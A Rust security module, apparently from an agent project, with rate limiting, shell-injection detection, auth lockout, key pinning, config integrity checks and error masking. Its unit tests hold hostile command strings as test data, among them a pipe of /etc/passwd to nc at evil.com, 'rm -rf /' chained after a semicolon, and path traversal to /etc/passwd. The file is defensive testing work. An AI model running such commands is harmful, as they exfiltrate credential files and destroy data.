//! Security module — Rate limiting, input sanitization, and connection security.
//!
//! Implements STRIDE mitigations:
//! - **Spoofing**: Identity verification + TOFU key pinning
//! - **Tampering**: AES-256-GCM integrity + audit hash chain + config hash verification
//! - **Repudiation**: Hash-chained audit log (audit.rs)
//! - **Information Disclosure**: Sensitive keyword filtering (ai.rs) + error masking
//! - **Denial of Service**: Rate limiting + connection limits + handshake timeouts
//! - **Elevation of Privilege**: RBAC policy enforcement (policy.rs)

use std::collections::HashMap;
use std::sync::Mutex;
use std::time::{Duration, Instant};

/// Rate limiter configuration
#[derive(Debug, Clone)]
pub struct RateLimitConfig {
    /// Maximum requests per window
    pub max_requests: usize,
    /// Time window duration
    pub window: Duration,
    /// Burst allowance (extra requests above limit in short bursts)
    pub burst: usize,
}

impl Default for RateLimitConfig {
    fn default() -> Self {
        Self {
            max_requests: 60,
            window: Duration::from_secs(60),
            burst: 10,
        }
    }
}

/// Per-client rate tracking
#[derive(Debug)]
struct ClientRate {
    /// Timestamps of recent requests
    requests: Vec<Instant>,
    /// Whether client is currently blocked
    blocked_until: Option<Instant>,
}

impl ClientRate {
    fn new() -> Self {
        Self {
            requests: Vec::new(),
            blocked_until: None,
        }
    }

    /// Check if request is allowed and record it
    fn check_and_record(&mut self, config: &RateLimitConfig, now: Instant) -> RateLimitResult {
        // Check if blocked
        if let Some(until) = self.blocked_until {
            if now < until {
                return RateLimitResult::Blocked {
                    retry_after: until.duration_since(now),
                };
            }
            self.blocked_until = None;
        }

        // Remove expired entries
        let window_start = now - config.window;
        self.requests.retain(|&t| t > window_start);

        // Check limit
        let total_limit = config.max_requests + config.burst;
        if self.requests.len() >= total_limit {
            // Block for remaining window
            let oldest = self.requests[0];
            let block_until = oldest + config.window;
            self.blocked_until = Some(block_until);
            return RateLimitResult::Blocked {
                retry_after: block_until.duration_since(now),
            };
        }

        // Record request
        self.requests.push(now);

        let remaining = total_limit.saturating_sub(self.requests.len());
        if self.requests.len() > config.max_requests {
            RateLimitResult::AllowedBurst { remaining }
        } else {
            RateLimitResult::Allowed { remaining }
        }
    }
}

/// Rate limit check result
#[derive(Debug, PartialEq)]
pub enum RateLimitResult {
    /// Request allowed, normal rate
    Allowed { remaining: usize },
    /// Request allowed but using burst capacity
    AllowedBurst { remaining: usize },
    /// Request blocked
    Blocked { retry_after: Duration },
}

impl RateLimitResult {
    /// Whether the request is allowed
    pub fn is_allowed(&self) -> bool {
        matches!(
            self,
            RateLimitResult::Allowed { .. } | RateLimitResult::AllowedBurst { .. }
        )
    }
}

/// Rate limiter tracking per-client request rates
pub struct RateLimiter {
    config: RateLimitConfig,
    clients: Mutex<HashMap<String, ClientRate>>,
}

impl RateLimiter {
    /// Create a new rate limiter with the given config
    pub fn new(config: RateLimitConfig) -> Self {
        Self {
            config,
            clients: Mutex::new(HashMap::new()),
        }
    }

    /// Check if a request from the given client is allowed
    pub fn check(&self, client_id: &str) -> RateLimitResult {
        let now = Instant::now();
        let mut clients = self.clients.lock().unwrap();
        let entry = clients
            .entry(client_id.to_string())
            .or_insert_with(ClientRate::new);
        entry.check_and_record(&self.config, now)
    }

    /// Get the number of tracked clients
    pub fn tracked_clients(&self) -> usize {
        self.clients.lock().unwrap().len()
    }

    /// Clean up expired client entries
    pub fn cleanup(&self) {
        let now = Instant::now();
        let window = self.config.window;
        let mut clients = self.clients.lock().unwrap();
        clients.retain(|_, rate| {
            // Keep if has recent requests or is currently blocked
            let has_recent = rate
                .requests
                .iter()
                .any(|&t| now.duration_since(t) < window);
            let is_blocked = rate.blocked_until.map(|until| now < until).unwrap_or(false);
            has_recent || is_blocked
        });
    }
}

/// Input sanitization utilities
pub struct InputSanitizer;

impl InputSanitizer {
    /// Sanitize a command string — remove dangerous characters and sequences
    pub fn sanitize_command(input: &str) -> String {
        let trimmed = input.trim();

        // Remove null bytes
        let cleaned: String = trimmed.chars().filter(|&c| c != '\0').collect();

        // Limit length
        if cleaned.len() > 4096 {
            return cleaned[..4096].to_string();
        }

        cleaned
    }

    /// Check if input contains shell injection patterns
    pub fn has_injection_risk(input: &str) -> bool {
        Self::has_injection_risk_with_pipe_whitelist(input, &[])
    }

    /// Check if input contains shell injection patterns, allowing whitelisted pipe commands.
    ///
    /// When `allowed_pipe_commands` is non-empty, a single pipe (`|`) is permitted
    /// provided the right-hand-side command is in the whitelist.
    /// Multiple pipes and all other dangerous patterns are always rejected.
    pub fn has_injection_risk_with_pipe_whitelist(
        input: &str,
        allowed_pipe_commands: &[String],
    ) -> bool {
        // Patterns that are always dangerous (pipe handled separately)
        let always_dangerous = [
            "$(", "`", "&&", "||", ";", ">", "<", ">>", "<<", "\\n", "\n", "\r", "../", "..\\",
        ];

        for pattern in &always_dangerous {
            if input.contains(pattern) {
                return true;
            }
        }

        // Check pipe usage
        if input.contains('|') {
            if allowed_pipe_commands.is_empty() {
                return true; // no whitelist → all pipes blocked
            }

            let parts: Vec<&str> = input.split('|').collect();
            // Only allow a single pipe (two segments)
            if parts.len() != 2 {
                return true;
            }

            let rhs = parts[1].trim();
            // Extract the base command (first word) from the right-hand side
            let rhs_cmd = rhs.split_whitespace().next().unwrap_or("");
            if !allowed_pipe_commands
                .iter()
                .any(|allowed| allowed == rhs_cmd)
            {
                return true; // pipe target not in whitelist
            }
        }

        false
    }

    /// Validate a peer ID format
    pub fn is_valid_peer_id(peer_id: &str) -> bool {
        // UUID format: 8-4-4-4-12 hex chars
        let parts: Vec<&str> = peer_id.split('-').collect();
        if parts.len() != 5 {
            return false;
        }

        let expected_lengths = [8, 4, 4, 4, 12];
        for (part, &expected_len) in parts.iter().zip(&expected_lengths) {
            if part.len() != expected_len || !part.chars().all(|c| c.is_ascii_hexdigit()) {
                return false;
            }
        }

        true
    }

    /// Validate a capability name
    pub fn is_valid_capability(cap: &str) -> bool {
        !cap.is_empty()
            && cap.len() <= 64
            && cap.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
    }

    /// Validate config value — no control characters
    pub fn is_safe_config_value(value: &str) -> bool {
        !value.chars().any(|c| c.is_control() && c != '\n') && value.len() <= 1024
    }
}

/// Connection security tracker — monitors for suspicious connection patterns
pub struct ConnectionTracker {
    /// Failed auth attempts per IP
    failed_auths: Mutex<HashMap<String, Vec<Instant>>>,
    /// Max failures before lockout
    max_failures: usize,
    /// Lockout duration
    lockout_duration: Duration,
    /// Failure tracking window
    failure_window: Duration,
}

impl ConnectionTracker {
    /// Create a new connection tracker
    pub fn new() -> Self {
        Self {
            failed_auths: Mutex::new(HashMap::new()),
            max_failures: 5,
            lockout_duration: Duration::from_secs(300), // 5 min lockout
            failure_window: Duration::from_secs(60),    // Count failures in 1 min
        }
    }

    /// Record a failed authentication attempt
    pub fn record_failure(&self, peer_addr: &str) {
        let mut failures = self.failed_auths.lock().unwrap();
        let entry = failures.entry(peer_addr.to_string()).or_default();
        entry.push(Instant::now());
    }

    /// Check if a peer is locked out
    pub fn is_locked_out(&self, peer_addr: &str) -> bool {
        let failures = self.failed_auths.lock().unwrap();
        if let Some(attempts) = failures.get(peer_addr) {
            let now = Instant::now();
            let recent_failures = attempts
                .iter()
                .filter(|&&t| now.duration_since(t) < self.failure_window)
                .count();

            if recent_failures >= self.max_failures {
                // Check if still in lockout period
                if let Some(&last) = attempts.last() {
                    return now.duration_since(last) < self.lockout_duration;
                }
            }
        }
        false
    }

    /// Clear failure records for a peer (after successful auth)
    pub fn clear_failures(&self, peer_addr: &str) {
        let mut failures = self.failed_auths.lock().unwrap();
        failures.remove(peer_addr);
    }

    /// Clean up old entries
    pub fn cleanup(&self) {
        let now = Instant::now();
        let window = self.lockout_duration;
        let mut failures = self.failed_auths.lock().unwrap();
        failures.retain(|_, attempts| {
            attempts.retain(|&t| now.duration_since(t) < window);
            !attempts.is_empty()
        });
    }
}

impl Default for ConnectionTracker {
    fn default() -> Self {
        Self::new()
    }
}

/// TOFU (Trust On First Use) key pinning store.
///
/// Remembers the first public key seen for each peer ID. If the same peer
/// presents a different key later, it is rejected — preventing MITM attacks.
pub struct TofuKeyStore {
    /// peer_id → hex-encoded public key seen on first connection
    pinned_keys: Mutex<HashMap<String, String>>,
}

impl TofuKeyStore {
    /// Create an empty TOFU store
    pub fn new() -> Self {
        Self {
            pinned_keys: Mutex::new(HashMap::new()),
        }
    }

    /// Pin or verify a peer's public key.
    ///
    /// Returns `Ok(true)` if the key is newly pinned, `Ok(false)` if it matches
    /// a previously pinned key, or `Err` with a reason if there is a mismatch.
    pub fn verify_or_pin(&self, peer_id: &str, public_key_hex: &str) -> Result<bool, String> {
        let mut keys = self.pinned_keys.lock().unwrap();
        if let Some(pinned) = keys.get(peer_id) {
            if pinned == public_key_hex {
                Ok(false) // Already pinned, matches
            } else {
                Err(format!(
                    "TOFU key mismatch for peer {}: expected {}, got {}",
                    peer_id,
                    &pinned[..16.min(pinned.len())],
                    &public_key_hex[..16.min(public_key_hex.len())]
                ))
            }
        } else {
            keys.insert(peer_id.to_string(), public_key_hex.to_string());
            Ok(true) // Newly pinned
        }
    }

    /// Forget a peer's pinned key (e.g. when re-keying)
    pub fn remove_pin(&self, peer_id: &str) -> bool {
        let mut keys = self.pinned_keys.lock().unwrap();
        keys.remove(peer_id).is_some()
    }

    /// Number of pinned keys
    pub fn count(&self) -> usize {
        self.pinned_keys.lock().unwrap().len()
    }
}

impl Default for TofuKeyStore {
    fn default() -> Self {
        Self::new()
    }
}

/// Configuration integrity verifier.
///
/// Computes and stores a SHA-256 hash of the config file at load-time,
/// then can re-verify to detect external tampering.
pub struct ConfigIntegrity {
    /// SHA-256 hex hash of the config at load time
    original_hash: Mutex<Option<String>>,
    /// Path to the config file
    config_path: Mutex<Option<std::path::PathBuf>>,
}

impl ConfigIntegrity {
    /// Create a new integrity checker
    pub fn new() -> Self {
        Self {
            original_hash: Mutex::new(None),
            config_path: Mutex::new(None),
        }
    }

    /// Record the hash of a config file at load-time
    pub fn record(&self, path: &std::path::Path) -> Result<String, std::io::Error> {
        let content = std::fs::read(path)?;
        let hash = Self::sha256_hex(&content);
        *self.original_hash.lock().unwrap() = Some(hash.clone());
        *self.config_path.lock().unwrap() = Some(path.to_path_buf());
        Ok(hash)
    }

    /// Verify the config file has not been modified since load
    pub fn verify(&self) -> Result<bool, String> {
        let path_guard = self.config_path.lock().unwrap();
        let path = path_guard
            .as_ref()
            .ok_or_else(|| "no config path recorded".to_string())?;
        let hash_guard = self.original_hash.lock().unwrap();
        let original = hash_guard
            .as_ref()
            .ok_or_else(|| "no original hash recorded".to_string())?;

        let current_content = std::fs::read(path).map_err(|e| e.to_string())?;
        let current_hash = Self::sha256_hex(&current_content);

        Ok(&current_hash == original)
    }

    /// Get the stored hash
    pub fn hash(&self) -> Option<String> {
        self.original_hash.lock().unwrap().clone()
    }

    fn sha256_hex(data: &[u8]) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(data);
        hex::encode(hasher.finalize())
    }
}

impl Default for ConfigIntegrity {
    fn default() -> Self {
        Self::new()
    }
}

/// Error masking — strip internal implementation details from errors
/// before sending them to external clients.
pub struct ErrorMasker;

impl ErrorMasker {
    /// Mask an error message for external consumption.
    ///
    /// Removes file paths, line numbers, and internal module names.
    pub fn mask(error: &str) -> String {
        let mut masked = error.to_string();

        // Remove Windows paths (e.g., C:\Users\..., D:\project\...)
        masked = Self::replace_windows_paths(&masked);

        // Remove Unix paths (e.g., /home/user/...)
        masked = Self::replace_unix_paths(&masked);

        // Remove line:column references (e.g., "at line 42", "line 42:10")
        masked = Self::replace_line_refs(&masked);

        // Remove Rust module paths (e.g., "edgeclaw_agent::session::...")
        masked = Self::replace_module_paths(&masked);

        masked
    }

    fn replace_windows_paths(input: &str) -> String {
        let mut result = String::new();
        let chars: Vec<char> = input.chars().collect();
        let mut i = 0;
        while i < chars.len() {
            if i + 2 < chars.len()
                && chars[i].is_ascii_alphabetic()
                && chars[i + 1] == ':'
                && chars[i + 2] == '\\'
            {
                result.push_str("[path]");
                i += 3;
                while i < chars.len() && !chars[i].is_whitespace() && chars[i] != ':' {
                    i += 1;
                }
            } else {
                result.push(chars[i]);
                i += 1;
            }
        }
        result
    }

    fn replace_unix_paths(input: &str) -> String {
        let mut s = input.to_string();
        for prefix in &["/home/", "/usr/", "/tmp/", "/var/", "/etc/"] {
            while let Some(start) = s.find(prefix) {
                let end = s[start..]
                    .find(|c: char| c.is_whitespace() || c == ':')
                    .map(|e| start + e)
                    .unwrap_or(s.len());
                s.replace_range(start..end, "[path]");
            }
        }
        s
    }

    fn replace_line_refs(input: &str) -> String {
        let lower = input.to_lowercase();
        if !lower.contains("line ") {
            return input.to_string();
        }
        let mut result = String::new();
        let mut rest = input;
        while !rest.is_empty() {
            let lower_rest = rest.to_lowercase();
            if let Some(pos) = lower_rest.find("line ") {
                let actual_start = if pos >= 3 && lower_rest[pos - 3..pos] == *"at " {
                    pos - 3
                } else {
                    pos
                };
                result.push_str(&rest[..actual_start]);
                let after_line = &rest[pos + 5..];
                let skip = after_line
                    .find(|c: char| !c.is_ascii_digit() && c != ':')
                    .unwrap_or(after_line.len());
                result.push_str("[internal]");
                rest = &after_line[skip..];
            } else {
                result.push_str(rest);
                break;
            }
        }
        result
    }

    fn replace_module_paths(input: &str) -> String {
        let mut result = String::new();
        let mut rest = input;
        while let Some(pos) = rest.find("::") {
            let word_start = rest[..pos]
                .rfind(|c: char| !c.is_alphanumeric() && c != '_')
                .map(|p| p + 1)
                .unwrap_or(0);
            let after = &rest[pos + 2..];
            if let Some(next_sep) = after.find("::") {
                let end_of_path = after[next_sep + 2..]
                    .find(|c: char| !c.is_alphanumeric() && c != '_' && c != ':')
                    .map(|e| pos + 2 + next_sep + 2 + e)
                    .unwrap_or(rest.len());
                result.push_str(&rest[..word_start]);
                result.push_str("[module]");
                rest = &rest[end_of_path..];
            } else {
                result.push_str(&rest[..pos + 2]);
                rest = after;
            }
        }
        result.push_str(rest);
        result
    }

    /// Return a generic safe message for a given error category
    pub fn safe_message(category: &str) -> &'static str {
        match category {
            "crypto" => "encryption operation failed",
            "auth" => "authentication failed",
            "session" => "session error",
            "policy" => "access denied",
            "exec" => "command execution failed",
            "config" => "configuration error",
            _ => "internal error",
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_rate_limiter_allows_normal_traffic() {
        let config = RateLimitConfig {
            max_requests: 5,
            window: Duration::from_secs(60),
            burst: 2,
        };
        let limiter = RateLimiter::new(config);

        // First 5 requests should be Allowed
        for _ in 0..5 {
            let result = limiter.check("client-1");
            assert!(result.is_allowed());
        }
    }

    #[test]
    fn test_rate_limiter_burst() {
        let config = RateLimitConfig {
            max_requests: 3,
            window: Duration::from_secs(60),
            burst: 2,
        };
        let limiter = RateLimiter::new(config);

        // Normal (3)
        for _ in 0..3 {
            assert!(matches!(
                limiter.check("client-1"),
                RateLimitResult::Allowed { .. }
            ));
        }

        // Burst (2)
        for _ in 0..2 {
            assert!(matches!(
                limiter.check("client-1"),
                RateLimitResult::AllowedBurst { .. }
            ));
        }

        // Blocked
        assert!(matches!(
            limiter.check("client-1"),
            RateLimitResult::Blocked { .. }
        ));
    }

    #[test]
    fn test_rate_limiter_independent_clients() {
        let config = RateLimitConfig {
            max_requests: 2,
            window: Duration::from_secs(60),
            burst: 0,
        };
        let limiter = RateLimiter::new(config);

        limiter.check("client-a");
        limiter.check("client-a");
        // client-a exhausted

        // client-b should still be fine
        assert!(limiter.check("client-b").is_allowed());
        assert_eq!(limiter.tracked_clients(), 2);
    }

    #[test]
    fn test_sanitize_command() {
        assert_eq!(InputSanitizer::sanitize_command("  status  "), "status");
        assert_eq!(
            InputSanitizer::sanitize_command("test\0command"),
            "testcommand"
        );

        // Long input truncated
        let long_input = "a".repeat(5000);
        assert_eq!(InputSanitizer::sanitize_command(&long_input).len(), 4096);
    }

    #[test]
    fn test_injection_detection() {
        assert!(InputSanitizer::has_injection_risk("ls; rm -rf /"));
        assert!(InputSanitizer::has_injection_risk("$(whoami)"));
        assert!(InputSanitizer::has_injection_risk("cat /etc/../shadow"));
        assert!(InputSanitizer::has_injection_risk("echo `id`"));
        assert!(InputSanitizer::has_injection_risk("cmd && del"));
        assert!(InputSanitizer::has_injection_risk("pipe | something"));

        assert!(!InputSanitizer::has_injection_risk("status"));
        assert!(!InputSanitizer::has_injection_risk("disk usage"));
        assert!(!InputSanitizer::has_injection_risk("memory check"));
    }

    #[test]
    fn test_valid_peer_id() {
        assert!(InputSanitizer::is_valid_peer_id(
            "e32d8f68-d67c-45a7-817f-b7038ff60ba3"
        ));
        assert!(InputSanitizer::is_valid_peer_id(
            "00000000-0000-0000-0000-000000000000"
        ));
        assert!(!InputSanitizer::is_valid_peer_id("not-a-uuid"));
        assert!(!InputSanitizer::is_valid_peer_id(""));
        assert!(!InputSanitizer::is_valid_peer_id(
            "zzzzzzzz-zzzz-zzzz-zzzz-zzzzzzzzzzzz"
        ));
    }

    #[test]
    fn test_valid_capability() {
        assert!(InputSanitizer::is_valid_capability("status_query"));
        assert!(InputSanitizer::is_valid_capability("shell_exec"));
        assert!(!InputSanitizer::is_valid_capability(""));
        assert!(!InputSanitizer::is_valid_capability("has space"));
        assert!(!InputSanitizer::is_valid_capability("has;semicolon"));
    }

    #[test]
    fn test_safe_config_value() {
        assert!(InputSanitizer::is_safe_config_value("normal value"));
        assert!(InputSanitizer::is_safe_config_value("line\nbreak"));
        assert!(!InputSanitizer::is_safe_config_value("has\x00null"));

        let too_long = "x".repeat(1025);
        assert!(!InputSanitizer::is_safe_config_value(&too_long));
    }

    #[test]
    fn test_connection_tracker_lockout() {
        let tracker = ConnectionTracker {
            failed_auths: Mutex::new(HashMap::new()),
            max_failures: 3,
            lockout_duration: Duration::from_secs(300),
            failure_window: Duration::from_secs(60),
        };

        let peer = "192.168.1.100";

        // Not locked initially
        assert!(!tracker.is_locked_out(peer));

        // Record failures
        for _ in 0..3 {
            tracker.record_failure(peer);
        }

        // Should be locked out
        assert!(tracker.is_locked_out(peer));

        // Clear
        tracker.clear_failures(peer);
        assert!(!tracker.is_locked_out(peer));
    }

    #[test]
    fn test_connection_tracker_cleanup() {
        let tracker = ConnectionTracker::new();
        tracker.record_failure("peer-1");
        tracker.record_failure("peer-2");
        tracker.cleanup();
        // Both still have recent entries
    }

    #[test]
    fn test_rate_limit_result_allowed() {
        let allowed = RateLimitResult::Allowed { remaining: 5 };
        assert!(allowed.is_allowed());

        let burst = RateLimitResult::AllowedBurst { remaining: 2 };
        assert!(burst.is_allowed());

        let blocked = RateLimitResult::Blocked {
            retry_after: Duration::from_secs(30),
        };
        assert!(!blocked.is_allowed());
    }

    // ── TOFU Key Pinning Tests ──

    #[test]
    fn test_tofu_pin_new_key() {
        let store = TofuKeyStore::new();
        let result = store.verify_or_pin("peer-1", "aabbccdd").unwrap();
        assert!(result); // Newly pinned
        assert_eq!(store.count(), 1);
    }

    #[test]
    fn test_tofu_verify_same_key() {
        let store = TofuKeyStore::new();
        store.verify_or_pin("peer-1", "aabbccdd").unwrap();
        let result = store.verify_or_pin("peer-1", "aabbccdd").unwrap();
        assert!(!result); // Already pinned, same key
    }

    #[test]
    fn test_tofu_reject_different_key() {
        let store = TofuKeyStore::new();
        store.verify_or_pin("peer-1", "aabbccdd").unwrap();
        let result = store.verify_or_pin("peer-1", "eeff0011");
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("mismatch"));
    }

    #[test]
    fn test_tofu_remove_pin() {
        let store = TofuKeyStore::new();
        store.verify_or_pin("peer-1", "aabbccdd").unwrap();
        assert!(store.remove_pin("peer-1"));
        assert!(!store.remove_pin("peer-1")); // Already removed
        assert_eq!(store.count(), 0);

        // Can pin a new key now
        let result = store.verify_or_pin("peer-1", "eeff0011").unwrap();
        assert!(result);
    }

    #[test]
    fn test_tofu_multiple_peers() {
        let store = TofuKeyStore::new();
        store.verify_or_pin("peer-1", "key1").unwrap();
        store.verify_or_pin("peer-2", "key2").unwrap();
        assert_eq!(store.count(), 2);

        // Peer 1 with wrong key fails, peer 2 with correct key succeeds
        assert!(store.verify_or_pin("peer-1", "key2").is_err());
        assert!(store.verify_or_pin("peer-2", "key2").is_ok());
    }

    // ── Config Integrity Tests ──

    #[test]
    fn test_config_integrity_record_and_verify() {
        let integrity = ConfigIntegrity::new();
        let tmpdir = std::env::temp_dir().join("edgeclaw_test_config_integrity");
        let _ = std::fs::create_dir_all(&tmpdir);
        let config_path = tmpdir.join("test_config.toml");
        std::fs::write(&config_path, b"[agent]\nname = \"test\"\n").unwrap();

        let hash = integrity.record(&config_path).unwrap();
        assert!(!hash.is_empty());
        assert_eq!(hash.len(), 64); // SHA-256 hex = 64 chars

        // Verify unchanged
        assert!(integrity.verify().unwrap());

        // Tamper with the file
        std::fs::write(&config_path, b"[agent]\nname = \"hacked\"\n").unwrap();
        assert!(!integrity.verify().unwrap());

        // Cleanup
        let _ = std::fs::remove_dir_all(&tmpdir);
    }

    #[test]
    fn test_config_integrity_no_recording() {
        let integrity = ConfigIntegrity::new();
        assert!(integrity.hash().is_none());
        assert!(integrity.verify().is_err());
    }

    // ── Pipe Whitelist Tests ──

    #[test]
    fn test_pipe_whitelist_empty_blocks_all() {
        assert!(InputSanitizer::has_injection_risk_with_pipe_whitelist(
            "ps aux | grep nginx",
            &[]
        ));
    }

    #[test]
    fn test_pipe_whitelist_allows_whitelisted_command() {
        let whitelist = vec!["grep".to_string(), "head".to_string(), "sort".to_string()];
        assert!(!InputSanitizer::has_injection_risk_with_pipe_whitelist(
            "ps aux | grep nginx",
            &whitelist
        ));
        assert!(!InputSanitizer::has_injection_risk_with_pipe_whitelist(
            "cat file.txt | head -n 10",
            &whitelist
        ));
        assert!(!InputSanitizer::has_injection_risk_with_pipe_whitelist(
            "ls -la | sort",
            &whitelist
        ));
    }

    #[test]
    fn test_pipe_whitelist_blocks_non_whitelisted() {
        let whitelist = vec!["grep".to_string()];
        assert!(InputSanitizer::has_injection_risk_with_pipe_whitelist(
            "cat /etc/passwd | nc evil.com 1234",
            &whitelist
        ));
    }

    #[test]
    fn test_pipe_whitelist_blocks_multiple_pipes() {
        let whitelist = vec!["grep".to_string(), "wc".to_string()];
        // Multiple pipes are always rejected
        assert!(InputSanitizer::has_injection_risk_with_pipe_whitelist(
            "ps aux | grep nginx | wc -l",
            &whitelist
        ));
    }

    #[test]
    fn test_pipe_whitelist_still_blocks_other_injection() {
        let whitelist = vec!["grep".to_string()];
        // Semicolon injection still blocked
        assert!(InputSanitizer::has_injection_risk_with_pipe_whitelist(
            "echo hello; rm -rf /",
            &whitelist
        ));
        // Command substitution still blocked
        assert!(InputSanitizer::has_injection_risk_with_pipe_whitelist(
            "echo $(whoami)",
            &whitelist
        ));
    }

    // ── Error Masking Tests ──

    #[test]
    fn test_error_masker_windows_paths() {
        let masked = ErrorMasker::mask("failed to read C:\\Users\\admin\\secret.key");
        assert!(!masked.contains("C:\\Users"));
        assert!(masked.contains("[path]"));
    }

    #[test]
    fn test_error_masker_unix_paths() {
        let masked = ErrorMasker::mask("cannot open /home/user/.ssh/id_rsa");
        assert!(!masked.contains("/home/user"));
        assert!(masked.contains("[path]"));
    }

    #[test]
    fn test_error_masker_safe_message() {
        assert_eq!(
            ErrorMasker::safe_message("crypto"),
            "encryption operation failed"
        );
        assert_eq!(ErrorMasker::safe_message("auth"), "authentication failed");
        assert_eq!(ErrorMasker::safe_message("unknown"), "internal error");
    }

    #[test]
    fn test_error_masker_preserves_safe_text() {
        let masked = ErrorMasker::mask("timeout after 30 seconds");
        assert_eq!(masked, "timeout after 30 seconds");
    }

    #[test]
    fn test_error_masker_line_refs() {
        let masked = ErrorMasker::mask("error at line 42: something");
        assert!(!masked.contains("42"));
        assert!(masked.contains("[internal]"));
    }

    #[test]
    fn test_error_masker_module_paths() {
        let masked = ErrorMasker::mask("edgeclaw_agent::session::manager failed");
        assert!(!masked.contains("edgeclaw_agent::session::manager"));
        assert!(masked.contains("[module]"));
    }

    #[test]
    fn test_rate_limiter_cleanup_removes_expired() {
        let config = RateLimitConfig {
            max_requests: 100,
            window: Duration::from_millis(1),
            burst: 0,
        };
        let limiter = RateLimiter::new(config);
        limiter.check("old-client");
        // Wait for the window to expire
        std::thread::sleep(Duration::from_millis(10));
        limiter.cleanup();
        assert_eq!(limiter.tracked_clients(), 0);
    }

    #[test]
    fn test_connection_tracker_default() {
        let tracker = ConnectionTracker::default();
        assert!(!tracker.is_locked_out("any-peer"));
    }

    #[test]
    fn test_tofu_default() {
        let store = TofuKeyStore::default();
        assert_eq!(store.count(), 0);
    }

    #[test]
    fn test_config_integrity_default() {
        let ci = ConfigIntegrity::default();
        assert!(ci.hash().is_none());
    }

    #[test]
    fn test_rate_limit_config_default() {
        let cfg = RateLimitConfig::default();
        assert_eq!(cfg.max_requests, 60);
        assert_eq!(cfg.burst, 10);
        assert_eq!(cfg.window, Duration::from_secs(60));
    }

    #[test]
    fn test_sanitize_command_empty() {
        assert_eq!(InputSanitizer::sanitize_command(""), "");
    }

    #[test]
    fn test_no_injection_normal_commands() {
        assert!(!InputSanitizer::has_injection_risk("cargo test"));
        assert!(!InputSanitizer::has_injection_risk("ls -la"));
        assert!(!InputSanitizer::has_injection_risk("echo hello world"));
    }

    #[test]
    fn test_injection_redirect() {
        assert!(InputSanitizer::has_injection_risk("echo x > file"));
        assert!(InputSanitizer::has_injection_risk("cat < file"));
        assert!(InputSanitizer::has_injection_risk("echo x >> file"));
    }

    #[test]
    fn test_injection_newline() {
        assert!(InputSanitizer::has_injection_risk("cmd1\ncmd2"));
        assert!(InputSanitizer::has_injection_risk("cmd1\rcmd2"));
    }

    #[test]
    fn test_injection_path_traversal() {
        assert!(InputSanitizer::has_injection_risk("cat ../../etc/passwd"));
        assert!(InputSanitizer::has_injection_risk("type ..\\..\\windows"));
    }

    #[test]
    fn test_error_masker_mixed() {
        let masked = ErrorMasker::mask(
            "failed at C:\\Users\\admin\\code.rs line 99: edgeclaw_agent::crypto::aes failed",
        );
        assert!(!masked.contains("C:\\Users"));
        assert!(!masked.contains("99"));
        assert!(masked.contains("[path]"));
    }

    #[test]
    fn test_error_masker_safe_categories() {
        assert_eq!(ErrorMasker::safe_message("session"), "session error");
        assert_eq!(ErrorMasker::safe_message("policy"), "access denied");
        assert_eq!(
            ErrorMasker::safe_message("exec"),
            "command execution failed"
        );
        assert_eq!(ErrorMasker::safe_message("config"), "configuration error");
    }
}
